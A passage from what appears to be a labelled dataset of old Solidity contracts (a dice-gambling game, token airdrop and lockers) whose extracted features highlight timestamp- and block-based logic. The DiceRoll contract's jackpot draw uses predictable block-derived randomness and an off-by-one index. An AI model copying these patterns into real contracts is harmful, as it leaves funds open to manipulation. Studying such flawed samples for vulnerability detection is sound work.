keccak256(sha256(context_name, queryId)))) return false;\n bytes memory sig1 = new bytes(uint(proof[ledgerProofLength+(32+8+1+32)+1])+2);\n copyBytes(proof, ledgerProofLength+(32+8+1+32), sig1.length, sig1, 0);\n if (!matchBytes32Prefix(sha256(sig1), result, uint(proof[ledgerProofLength+32+8]))) return false;\n bytes memory commitmentSlice1 = new bytes(8+1+32);\n copyBytes(proof, ledgerProofLength+32, 8+1+32, commitmentSlice1, 0);\n bytes memory sessionPubkey = new bytes(64);\n uint sig2offset = ledgerProofLength+32+(8+1+32)+sig1.length+65;\n copyBytes(proof, sig2offset-64, 64, sessionPubkey, 0);\n bytes32 sessionPubkeyHash = sha256(sessionPubkey);\n if (oraclize_randomDS_args[queryId] == keccak256(commitmentSlice1, sessionPubkeyHash)){\n delete oraclize_randomDS_args[queryId];\n } else return false;\n bytes memory tosign1 = new bytes(32+8+1+32);\n copyBytes(proof, ledgerProofLength, 32+8+1+32, tosign1, 0);\n if (!verifySig(sha256(tosign1), sig1, sessionPubkey)) return false;\n if (oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] == false){\n oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] = oraclize_randomDS_proofVerify__sessionKeyValidity(proof, sig2offset);\n }\n return oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash];\n }\n function copyBytes(bytes from, uint fromOffset, uint length, bytes to, uint toOffset) internal pure returns (bytes) {\n uint minLength = length + toOffset;\n require(to.length >= minLength);\n uint i = 32 + fromOffset;\n uint j = 32 + toOffset;\n while (i < (32 + fromOffset + length)) {\n assembly {\n let tmp := mload(add(from, i))\n mstore(add(to, j), tmp)\n }\n i += 32;\n j += 32;\n }\n return to;\n }\n function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\n bool ret;\n address addr;\n assembly {\n let size := mload(0x40)\n mstore(size, hash)\n mstore(add(size, 32), v)\n mstore(add(size, 64), r)\n mstore(add(size, 96), s)\n ret := call(3000, 1, 0, size, 128, size, 32)\n addr := mload(size)\n }\n return (ret, addr);\n }\n function ecrecovery(bytes32 hash, bytes sig) internal returns (bool, address) {\n bytes32 r;\n bytes32 s;\n uint8 v;\n if (sig.length != 65)\n return (false, 0);\n assembly {\n r := mload(add(sig, 32))\n s := mload(add(sig, 64))\n v := byte(0, mload(add(sig, 96)))\n }\n if (v < 27)\n v += 27;\n if (v != 27 && v != 28)\n return (false, 0);\n return safer_ecrecover(hash, v, r, s);\n }\n}\ncontract SafeMath {\n function safeToAdd(uint a, uint b) pure internal returns (bool) {\n return (a + b >= a);\n }\n function safeAdd(uint a, uint b) pure internal returns (uint) {\n require(safeToAdd(a, b));\n return a + b;\n }\n function safeToSubtract(uint a, uint b) pure internal returns (bool) {\n return (b <= a);\n }\n function safeSub(uint a, uint b) pure internal returns (uint) {\n require(safeToSubtract(a, b));\n return a - b;\n }\n}\ncontract DiceRoll is SafeMath,usingOraclize {\n address public owner;\n uint8 constant public maxNumber = 99;\n uint8 constant public minNumber = 1;\n bool public gamePaused = false;\n bool public jackpotPaused = false;\n bool public refundPaused = false;\n uint16 public houseEdge;\n uint256 public maxProfit;\n uint16 public maxProfitAsPercentOfHouse;\n uint256 public minBet;\n uint256 public maxBet;\n uint16 public jackpotOfHouseEdge;\n uint256 public minJackpotBet;\n uint256 public jackpotBlance;\n address[] jackpotPlayer;\n uint256 JackpotPeriods = 1;\n uint64 nextJackpotTime;\n uint16 public jackpotPersent = 100;\n uint256 public totalWeiWon;\n uint256 public totalWeiWagered;\n mapping (bytes32 => address) playerAddress;\n mapping (bytes32 => uint256) playerBetAmount;\n mapping (bytes32 => uint8) playerNumberStart;\n mapping (bytes32 => uint8) playerNumberEnd;\n uint256 public oraclizeGasLimit;\n uint public oraclizeFee;\n uint seed;\n modifier betIsValid(uint256 _betSize, uint8 _start, uint8 _end) {\n require(_betSize >= minBet && _betSize <= maxBet && _start >= minNumber && _end <= maxNumber && _start < _end);\n _;\n }\n modifier oddEvenBetIsValid(uint256 _betSize, uint8 _oddeven) {\n require(_betSize >= minBet && _betSize <= maxBet && (_oddeven == 1 || _oddeven == 0));\n _;\n }\n modifier gameIsActive {\n require(!gamePaused);\n _;\n }\n modifier jackpotAreActive {\n require(!jackpotPaused);\n _;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n modifier onlyOraclize {\n require(msg.sender == oraclize_cbAddress());\n _;\n }\n event LogResult(bytes32 indexed QueryId, address indexed Address, uint8 DiceResult, uint256 Value, uint8 Status, uint8 Start, uint8 End, uint8 OddEven, uint256 BetValue);\n event LogRefund(bytes32 indexed QueryId, uint256 Amount);\n event LogJackpot(bytes32 indexed QueryId, address indexed Address, uint256 jackpotValue);\n event LogOwnerTransfer(address SentToAddress, uint256 AmountTransferred);\n event SendJackpotSuccesss(address indexed winner, uint256 amount, uint256 JackpotPeriods);\n function() public payable{\n setMaxProfit();\n }\n function DiceRoll() public {\n owner = msg.sender;\n houseEdge = 20;\n maxProfitAsPercentOfHouse = 100;\n minBet = 0.1 ether;\n maxBet = 1 ether;\n jackpotOfHouseEdge = 500;\n minJackpotBet = 0.1 ether;\n jackpotPersent = 100;\n oraclizeGasLimit = 300000;\n oraclizeFee = 1200000000000000;\n oraclize_setCustomGasPrice(4000000000);\n nextJackpotTime = uint64(block.timestamp);\n oraclize_setProof(proofType_Ledger);\n }\n function playerRoll(uint8 start, uint8 end) public payable gameIsActive betIsValid(msg.value, start, end) {\n totalWeiWagered += msg.value;\n bytes32 queryId = oraclize_newRandomDSQuery(0, 30, oraclizeGasLimit);\n playerAddress[queryId] = msg.sender;\n playerBetAmount[queryId] = msg.value;\n playerNumberStart[queryId] = start;\n playerNumberEnd[queryId] = end;\n }\n function oddEven(uint8 oddeven) public payable gameIsActive oddEvenBetIsValid(msg.value, oddeven) {\n totalWeiWagered += msg.value;\n bytes32 queryId = oraclize_newRandomDSQuery(0, 30, oraclizeGasLimit);\n playerAddress[queryId] = msg.sender;\n playerBetAmount[queryId] = msg.value;\n playerNumberStart[queryId] = oddeven;\n playerNumberEnd[queryId] = 0;\n }\n function __callback(bytes32 queryId, string result, bytes proof) public onlyOraclize {\n if (oraclize_randomDS_proofVerify__returnCode(queryId, result, proof) != 0) {\n if(!refundPaused){\n playerAddress[queryId].transfer(playerBetAmount[queryId]);\n LogRefund(queryId, playerBetAmount[queryId]);\n }\n }else{\n uint8 tempStart = playerNumberStart[queryId];\n uint8 tempEnd = playerNumberEnd[queryId];\n address tempAddress = playerAddress[queryId];\n uint256 tempAmount = playerBetAmount[queryId];\n uint8 probability;\n uint256 houseEdgeFee;\n uint256 playerProfit;\n uint8 random = uint8(uint256(keccak256(result)) % 100) + 1;\n delete playerAddress[queryId];\n delete playerBetAmount[queryId];\n delete playerNumberStart[queryId];\n delete playerNumberEnd[queryId];\n if(tempEnd == 0){\n if(random % 2 == tempStart){\n probability = 50;\n playerProfit = getProfit(probability,tempAmount);\n totalWeiWon = safeAdd(totalWeiWon, playerProfit);\n setMaxProfit();\n LogResult(queryId, tempAddress, random, playerProfit, 1, 0, 0, tempStart, tempAmount);\n houseEdgeFee = getHouseEdgeFee(probability, tempAmount);\n increaseJackpot(houseEdgeFee * jackpotOfHouseEdge / 1000, queryId, tempAddress, tempAmount);\n tempAddress.transfer(safeAdd(playerProfit, tempAmount));\n }else{\n LogResult(queryId, tempAddress, random, 0, 0, 0, 0, tempEnd, tempAmount);\n setMaxProfit();\n tempAddress.transfer(1);\n }\n }else if(tempEnd != 0 && tempStart != 0){\n if(tempStart <= random && random <= tempEnd){\n probability = tempEnd - tempStart + 1;\n playerProfit = getProfit(probability,tempAmount);\n totalWeiWon = safeAdd(totalWeiWon, playerProfit);\n setMaxProfit();\n LogResult(queryId, tempAddress, random, playerProfit, 1, tempStart, tempEnd, 2, tempAmount);\n houseEdgeFee = getHouseEdgeFee(probability, tempAmount);\n increaseJackpot(houseEdgeFee * jackpotOfHouseEdge / 1000, queryId, tempAddress, tempAmount);\n tempAddress.transfer(safeAdd(playerProfit, tempAmount));\n }else{\n LogResult(queryId, tempAddress, random, 0, 0, tempStart, tempEnd, 2, tempAmount);\n setMaxProfit();\n tempAddress.transfer(1);\n }\n }\n }\n }\n function increaseJackpot(uint256 increaseAmount, bytes32 _queryId, address _address, uint256 _amount) internal {\n require(increaseAmount < maxProfit);\n LogJackpot(_queryId, _address, increaseAmount);\n jackpotBlance = safeAdd(jackpotBlance, increaseAmount);\n if(_amount >= minJackpotBet){\n jackpotPlayer.push(_address);\n }\n }\n function createWinner() public onlyOwner jackpotAreActive {\n uint64 tmNow = uint64(block.timestamp);\n require(tmNow >= nextJackpotTime);\n require(jackpotPlayer.length > 0);\n uint random = rand() % jackpotPlayer.length;\n address winner = jackpotPlayer[random - 1];\n uint256 amount = jackpotBlance * jackpotPersent / 1000;\n require(jackpotBlance > amount);\n winner.transfer(amount);\n SendJackpotSuccesss(winner, amount, JackpotPeriods);\n jackpotBlance = safeSub(jackpotBlance, amount);\n jackpotPlayer.length = 0;\n nextJackpotTime = uint64(block.timestamp) + 72000;\n JackpotPeriods += 1;\n }\n function sendValueToJackpot() payable public jackpotAreActive {\n jackpotBlance = safeAdd(jackpotBlance, msg.value);\n }\n function getHouseEdgeFee(uint8 _probability, uint256 _betValue) view internal returns (uint256){\n return (_betValue * (100 - _probability) / _probability + _betValue) * houseEdge / 1000;\n }\n function getProfit(uint8 _probability, uint256 _betValue) view internal returns (uint256){\n uint256 tempProfit = ((_betValue * (100 - _probability) / _probability + _betValue) * (1000 - houseEdge) / 1000) - _betValue;\n if(tempProfit > maxProfit) tempProfit = maxProfit;\n return tempProfit;\n }\n function rand() internal returns (uint256) {\n seed = uint256(keccak256(seed, block.blockhash(block.number - 1), block.coinbase, block.difficulty));\n return seed;\n }\n function setMaxProfit() internal {\n maxProfit = (address(this).balance - jackpotBlance) * maxProfitAsPercentOfHouse / 1000;\n }\n function ownerSetOraclizeGas(uint newPrice, uint newGasLimit) public onlyOwner{\n require(newGasLimit > 50000 && newGasLimit <300000);\n require(newPrice > 1000000000 && newPrice <15000000000);\n oraclize_setCustomGasPrice(newPrice);\n oraclizeGasLimit = newGasLimit;\n oraclizeFee = newGasLimit * newPrice;\n }\n function ownerSetHouseEdge(uint16 newHouseEdge) public onlyOwner{\n require(newHouseEdge <= 1000);\n houseEdge = newHouseEdge;\n }\n function ownerSetMinJackpoBet(uint256 newVal) public onlyOwner{\n require(newVal <= 1 ether);\n minJackpotBet = newVal;\n }\n function ownerSetMaxProfitAsPercentOfHouse(uint8 newMaxProfitAsPercent) public onlyOwner{\n require(newMaxProfitAsPercent <= 1000);\n maxProfitAsPercentOfHouse = newMaxProfitAsPercent;\n setMaxProfit();\n }\n function ownerSetMinBet(uint256 newMinimumBet) public onlyOwner{\n minBet = newMinimumBet;\n }\n function ownerSetMaxBet(uint256 newMaxBet) public onlyOwner{\n maxBet = newMaxBet;\n }\n function ownerSetJackpotOfHouseEdge(uint16 newProportion) public onlyOwner{\n require(newProportion < 1000);\n jackpotOfHouseEdge = newProportion;\n }\n function ownerPauseGame(bool newStatus) public onlyOwner{\n gamePaused = newStatus;\n }\n function ownerPauseJackpot(bool newStatus) public onlyOwner{\n jackpotPaused = newStatus;\n }\n function ownerTransferEther(address sendTo, uint256 amount) public onlyOwner{\n sendTo.transfer(amount);\n setMaxProfit();\n LogOwnerTransfer(sendTo, amount);\n }\n function ownerChangeOwner(address newOwner) public onlyOwner{\n owner = newOwner;\n }\n function ownerkill() public onlyOwner{\n selfdestruct(owner);\n }\n}",
  "extract_feature": [
    "function DiceRoll() public {\nowner = msg.sender;\nhouseEdge = 20;\nmaxProfitAsPercentOfHouse = 100;\nminBet = 0.1 ether;\nmaxBet = 1 ether;\njackpotOfHouseEdge = 500;\nminJackpotBet = 0.1 ether;\njackpotPersent = 100;\noraclizeGasLimit = 300000;\noraclizeFee = 1200000000000000;\noraclize_setCustomGasPrice(4000000000);\nnextJackpotTime = uint64(block.timestamp);\noraclize_setProof(proofType_Ledger);\n}",
    "function createWinner() public onlyOwner jackpotAreActive {\nuint64 tmNow = uint64(block.timestamp);\nrequire(tmNow >= nextJackpotTime);\nrequire(jackpotPlayer.length > 0);\nuint random = rand() % jackpotPlayer.length;\naddress winner = jackpotPlayer[random - 1];\nuint256 amount = jackpotBlance * jackpotPersent / 1000;\nrequire(jackpotBlance > amount);\nwinner.transfer(amount);\nSendJackpotSuccesss(winner, amount, JackpotPeriods);\njackpotBlance = safeSub(jackpotBlance, amount);\njackpotPlayer.length = 0;\nnextJackpotTime = uint64(block.timestamp) + 72000;\nJackpotPeriods += 1;\n}",
    "function rand() internal returns (uint256) {\nseed = uint256(keccak256(seed, block.blockhash(block.number - 1), block.coinbase, block.difficulty));\nreturn seed;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f83"
  },
  "filename": "9445.sol",
  "content": "pragma solidity ^0.4.19;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BaseToken {\n using SafeMath for uint256;\n string public name;\n string public symbol;\n uint8 public decimals;\n uint256 public totalSupply;\n mapping (address => uint256) public balanceOf;\n mapping (address => mapping (address => uint256)) public allowance;\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n function _transfer(address _from, address _to, uint _value) internal {\n require(_to != address(0));\n require(balanceOf[_from] >= _value);\n balanceOf[_from] = balanceOf[_from].sub(_value);\n balanceOf[_to] = balanceOf[_to].add(_value);\n Transfer(_from, _to, _value);\n }\n function transfer(address _to, uint256 _value) public returns (bool success) {\n _transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n require(_value <= allowance[_from][msg.sender]);\n allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value);\n _transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowance[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n function renounceOwnership() public onlyOwner {\n OwnershipRenounced(owner);\n owner = address(0);\n }\n}\ncontract BurnToken is BaseToken {\n event Burn(address indexed from, uint256 value);\n function burn(uint256 _value) public returns (bool success) {\n require(balanceOf[msg.sender] >= _value);\n balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(msg.sender, _value);\n return true;\n }\n function burnFrom(address _from, uint256 _value) public returns (bool success) {\n require(balanceOf[_from] >= _value);\n require(_value <= allowance[_from][msg.sender]);\n balanceOf[_from] = balanceOf[_from].sub(_value);\n allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(_from, _value);\n return true;\n }\n}\ncontract AirdropToken is BaseToken, Ownable {\n uint256 public airAmount;\n address public airSender;\n uint256 public airLimitCount;\n mapping (address => uint256) public airCountOf;\n event Airdrop(address indexed from, uint256 indexed count, uint256 tokenValue);\n function airdrop() public {\n require(airAmount > 0);\n if (airLimitCount > 0 && airCountOf[msg.sender] >= airLimitCount) {\n revert();\n }\n _transfer(airSender, msg.sender, airAmount);\n airCountOf[msg.sender] = airCountOf[msg.sender].add(1);\n Airdrop(msg.sender, airCountOf[msg.sender], airAmount);\n }\n function changeAirAmount(uint256 newAirAmount) public onlyOwner {\n airAmount = newAirAmount;\n }\n function changeAirLimitCount(uint256 newAirLimitCount) public onlyOwner {\n airLimitCount = newAirLimitCount;\n }\n}\ncontract LockToken is BaseToken {\n struct LockMeta {\n uint256 remain;\n uint256 endtime;\n }\n mapping (address => LockMeta[]) public lockedAddresses;\n function _transfer(address _from, address _to, uint _value) internal {\n require(balanceOf[_from] >= _value);\n uint256 remain = balanceOf[_from].sub(_value);\n uint256 length = lockedAddresses[_from].length;\n for (uint256 i = 0; i < length; i++) {\n LockMeta storage meta = lockedAddresses[_from][i];\n if(block.timestamp < meta.endtime && remain < meta.remain){\n revert();\n }\n }\n super._transfer(_from, _to, _value);\n }\n}\ncontract ADEToken is BaseToken, BurnToken, AirdropToken, LockToken {\n function ADEToken() public {\n totalSupply = 36000000000000000;\n name = \"ADE Token\";\n symbol = \"ADE\";\n decimals = 8;\n owner = msg.sender;\n airAmount = 100000000;\n airSender = 0x8888888888888888888888888888888888888888;\n airLimitCount = 1;\n balanceOf[0xf03A4f01713F38EB7d63C6e691C956E8C56630F7] = 3600000000000000;\n Transfer(address(0), 0xf03A4f01713F38EB7d63C6e691C956E8C56630F7, 3600000000000000);\n lockedAddresses[0xf03A4f01713F38EB7d63C6e691C956E8C56630F7].push(LockMeta({remain: 3600000000000000, endtime: 1559923200}));\n lockedAddresses[0xf03A4f01713F38EB7d63C6e691C956E8C56630F7].push(LockMeta({remain: 3240000000000000, endtime: 1562515200}));\n lockedAddresses[0xf03A4f01713F38EB7d63C6e691C956E8C56630F7].push(LockMeta({remain: 2880000000000000, endtime: 1565193600}));\n lockedAddresses[0xf03A4f01713F38EB7d63C6e691C956E8C56630F7].push(LockMeta({remain: 2520000000000000, endtime: 1567872000}));\n lockedAddresses[0xf03A4f01713F38EB7d63C6e691C956E8C56630F7].push(LockMeta({remain: 2160000000000000, endtime: 1570464000}));\n lockedAddresses[0xf03A4f01713F38EB7d63C6e691C956E8C56630F7].push(LockMeta({remain: 1800000000000000, endtime: 1573142400}));\n lockedAddresses[0xf03A4f01713F38EB7d63C6e691C956E8C56630F7].push(LockMeta({remain: 1440000000000000, endtime: 1575734400}));\n lockedAddresses[0xf03A4f01713F38EB7d63C6e691C956E8C56630F7].push(LockMeta({remain: 1080000000000000, endtime: 1578412800}));\n lockedAddresses[0xf03A4f01713F38EB7d63C6e691C956E8C56630F7].push(LockMeta({remain: 720000000000000, endtime: 1581091200}));\n lockedAddresses[0xf03A4f01713F38EB7d63C6e691C956E8C56630F7].push(LockMeta({remain: 360000000000000, endtime: 1583596800}));\n balanceOf[0x76d2dbf2b1e589ff28EcC9203EA781f490696d20] = 3600000000000000;\n Transfer(address(0), 0x76d2dbf2b1e589ff28EcC9203EA781f490696d20, 3600000000000000);\n lockedAddresses[0x76d2dbf2b1e589ff28EcC9203EA781f490696d20].push(LockMeta({remain: 3600000000000000, endtime: 1544198400}));\n lockedAddresses[0x76d2dbf2b1e589ff28EcC9203EA781f490696d20].push(LockMeta({remain: 3240000000000000, endtime: 1546876800}));\n lockedAddresses[0x76d2dbf2b1e589ff28EcC9203EA781f490696d20].push(LockMeta({remain: 2880000000000000, endtime: 1549555200}));\n lockedAddresses[0x76d2dbf2b1e589ff28EcC9203EA781f490696d20].push(LockMeta({remain: 2520000000000000, endtime: 1551974400}));\n lockedAddresses[0x76d2dbf2b1e589ff28EcC9203EA781f490696d20].push(LockMeta({remain: 2160000000000000, endtime: 1554652800}));\n lockedAddresses[0x76d2dbf2b1e589ff28EcC9203EA781f490696d20].push(LockMeta({remain: 1800000000000000, endtime: 1557244800}));\n lockedAddresses[0x76d2dbf2b1e589ff28EcC9203EA781f490696d20].push(LockMeta({remain: 1440000000000000, endtime: 1559923200}));\n lockedAddresses[0x76d2dbf2b1e589ff28EcC9203EA781f490696d20].push(LockMeta({remain: 1080000000000000, endtime: 1562515200}));\n lockedAddresses[0x76d2dbf2b1e589ff28EcC9203EA781f490696d20].push(LockMeta({remain: 720000000000000, endtime: 1565193600}));\n lockedAddresses[0x76d2dbf2b1e589ff28EcC9203EA781f490696d20].push(LockMeta({remain: 360000000000000, endtime: 1567872000}));\n balanceOf[0x62d545CD7e67abA36e92c46cfA764c0f1626A9Ae] = 3600000000000000;\n Transfer(address(0), 0x62d545CD7e67abA36e92c46cfA764c0f1626A9Ae, 3600000000000000);\n balanceOf[0x8EaA35b0794ebFD412765DFb2Faa770Abae0f36b] = 10800000000000000;\n Transfer(address(0), 0x8EaA35b0794ebFD412765DFb2Faa770Abae0f36b, 10800000000000000);\n balanceOf[0x8ECeAd3B4c2aD7C4854a42F93A956F5e3CAE9Fd2] = 3564000000000000;\n Transfer(address(0), 0x8ECeAd3B4c2aD7C4854a42F93A956F5e3CAE9Fd2, 3564000000000000);\n lockedAddresses[0x8ECeAd3B4c2aD7C4854a42F93A956F5e3CAE9Fd2].push(LockMeta({remain: 1663200000000000, endtime: 1536336000}));\n lockedAddresses[0x8ECeAd3B4c2aD7C4854a42F93A956F5e3CAE9Fd2].push(LockMeta({remain: 1188000000000000, endtime: 1544198400}));\n balanceOf[0xC458A9017d796b2b4b76b416f814E1A8Ce82e310] = 10836000000000000;\n Transfer(address(0), 0xC458A9017d796b2b4b76b416f814E1A8Ce82e310, 10836000000000000);\n lockedAddresses[0xC458A9017d796b2b4b76b416f814E1A8Ce82e310].push(LockMeta({remain: 2167200000000000, endtime: 1536336000}));\n }\n function() public {\n airdrop();\n }\n}",
  "extract_feature": [
    "function _transfer(address _from, address _to, uint _value) internal {\nrequire(balanceOf[_from] >= _value);\nuint256 remain = balanceOf[_from].sub(_value);\nuint256 length = lockedAddresses[_from].length;\nfor (uint256 i = 0; i < length; i++) {\nLockMeta storage meta = lockedAddresses[_from][i];\nif(block.timestamp < meta.endtime && remain < meta.remain){\nrevert();\n}\n}\nsuper._transfer(_from, _to, _value);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f84"
  },
  "filename": "9474.sol",
  "content": "pragma solidity ^0.4.11;\ncontract Token {\n function transfer(address to, uint256 value) returns (bool success);\n function transferFrom(address from, address to, uint256 value) returns (bool success);\n function approve(address spender, uint256 value) returns (bool success);\n function totalSupply() constant returns (uint256 totalSupply) {}\n function balanceOf(address owner) constant returns (uint256 balance);\n function allowance(address owner, address spender) constant returns (uint256 remaining);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract WaltonTokenLocker {\n address public beneficiary;\n uint256 public releaseTime;\n string constant public name = \"refund locker V2\";\n Token public token = Token('0xb7cB1C96dB6B22b0D3d9536E0108d062BD488F74');\n function WaltonTokenLocker() public {\n beneficiary = address('0x38A9e09E14397Fe3A5Fe59dfc1d98D8B8897D610');\n releaseTime = 1538236800;\n }\n function release() public {\n if (block.timestamp < releaseTime)\n throw;\n uint256 totalTokenBalance = token.balanceOf(this);\n if (totalTokenBalance > 0)\n if (!token.transfer(beneficiary, totalTokenBalance))\n throw;\n }\n function releaseTimestamp() public constant returns (uint timestamp) {\n return releaseTime;\n }\n function currentTimestamp() public constant returns (uint timestamp) {\n return block.timestamp;\n }\n function secondsRemaining() public constant returns (uint timestamp) {\n if (block.timestamp < releaseTime)\n return releaseTime - block.timestamp;\n else\n return 0;\n }\n function tokenLocked() public constant returns (uint amount) {\n return token.balanceOf(this);\n }\n}",
  "extract_feature": [
    "function release() public {\nif (block.timestamp < releaseTime)\nthrow;\nuint256 totalTokenBalance = token.balanceOf(this);\nif (totalTokenBalance > 0)\nif (!token.transfer(beneficiary, totalTokenBalance))\nthrow;\n}",
    "function currentTimestamp() public constant returns (uint timestamp) {\nreturn block.timestamp;\n}",
    "function secondsRemaining() public constant returns (uint timestamp) {\nif (block.timestamp < releaseTime)\nreturn releaseTime - block.timestamp;\nelse\nreturn 0;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f85"
  },
  "filename": "9476.sol",
  "content": "pragma solidity ^0.4.11;\ncontract Token {\n function transfer(address to, uint256 value) returns (bool success);\n function transferFrom(address from, address to, uint256 value) returns (bool success);\n function approve(address spender, uint256 value) returns (bool success);\n function totalSupply() constant returns (uint256 totalSupply) {}\n function balanceOf(address owner) constant returns (uint256 balance);\n function allowance(address owner, address spender) constant returns (uint256 remaining);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract WaltonTokenLocker {\n address public beneficiary;\n uint256 public releaseTime;\n string constant public name = \"team locker v2\";\n Token public token = Token('0xb7cB1C96dB6B22b0D3d9536E0108d062BD488F74');\n function WaltonTokenLocker() public {\n beneficiary = address('0x732f589BA0b134DC35454716c4C87A06C890445b');\n releaseTime = 1563379200;\n }\n function release() public {\n if (block.timestamp < releaseTime)\n throw;\n uint256 totalTokenBalance = token.balanceOf(this);\n if (totalTokenBalance > 0)\n if (!token.transfer(beneficiary, totalTokenBalance))\n throw;\n }\n function releaseTimestamp() public constant returns (uint timestamp) {\n return releaseTime;\n }\n function currentTimestamp() public constant returns (uint timestamp) {\n return block.timestamp;\n }\n function secondsRemaining() public constant returns (uint timestamp) {\n if (block.timestamp < releaseTime)\n return releaseTime - block.timestamp;\n else\n return 0;\n }\n function tokenLocked() public constant returns (uint amount) {\n return token.balanceOf(this);\n }\n}",
  "extract_feature": [
    "function release() public {\nif (block.timestamp < releaseTime)\nthrow;\nuint256 totalTokenBalance = token.balanceOf(this);\nif (totalTokenBalance > 0)\nif (!token.transfer(beneficiary, totalTokenBalance))\nthrow;\n}",
    "function currentTimestamp() public constant returns (uint timestamp) {\nreturn block.timestamp;\n}",
    "function secondsRemaining() public constant returns (uint timestamp) {\nif (block.timestamp < releaseTime)\nreturn releaseTime - block.timestamp;\nelse\nreturn 0;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f86"
  },
  "filename": "9479.sol",
  "content": "pragma solidity ^0.4.21;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n emit Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n emit Unpause();\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract GeneNuggetsToken is Pausable,StandardToken {\n using SafeMath for uint256;\n string public name = 